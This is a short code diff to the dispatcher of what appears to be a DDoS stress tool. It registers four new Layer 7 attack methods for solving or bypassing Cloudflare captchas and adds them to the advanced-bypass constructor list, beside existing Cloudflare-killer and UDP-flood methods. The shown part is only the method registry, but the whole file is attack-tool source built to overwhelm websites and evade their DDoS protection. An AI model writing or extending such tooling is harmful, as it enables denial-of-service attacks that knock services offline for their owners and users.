@@ -45,6 +45,10 @@ export class MethodExecutor {
         map.set('CF-KILLER', Layer7.CloudflareKiller);
         map.set('CF-ADVANCED', Layer7.CloudflareAdvancedBypass);
         map.set('BROWSER-EMU', Layer7.BrowserEmulationAttack);
+        map.set('CAPTCHA-SOLVER', Layer7.CloudflareCaptchaSolver);
+        map.set('HYBRID-CF', Layer7.HybridCloudflareBypass);
+        map.set('MANUAL-BYPASS', Layer7.ManualCaptchaBypass);
+        map.set('ADVANCED-MANUAL', Layer7.AdvancedManualBypass);
 
         // Layer 4 Methods
         map.set('UDP', Layer4.UDPFlood);
@@ -124,7 +128,7 @@ export class MethodExecutor {
             
             // Check which constructor signature to use
             const simpleBypassMethods = ['CFB', 'CFBUAM', 'BYPASS', 'PRIVACYPASS', 'CAPTCHA', 'ULTIMATE'].includes(methodUpper);
-            const advancedBypassMethods = ['CF-ADVANCED', 'BROWSER-EMU'].includes(methodUpper);
+            const advancedBypassMethods = ['CF-ADVANCED', 'BROWSER-EMU', 'CAPTCHA-SOLVER', 'HYBRID-CF', 'MANUAL-BYPASS', 'ADVANCED-MANUAL'].includes(methodUpper);
             
             for (let i = 0; i < numInstances; i++) {
                 let attack;
